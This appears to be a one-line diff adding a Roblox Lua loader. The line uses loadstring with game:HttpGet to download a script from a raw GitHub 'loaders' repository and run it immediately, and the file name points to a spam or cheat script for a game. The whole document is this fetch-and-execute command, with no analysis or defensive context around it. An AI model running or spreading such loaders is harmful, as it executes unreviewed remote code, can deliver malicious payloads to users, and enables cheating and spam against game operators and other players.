@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/scrooms-undergarden-spam1-q223eo94ob5bo2.lua"))()
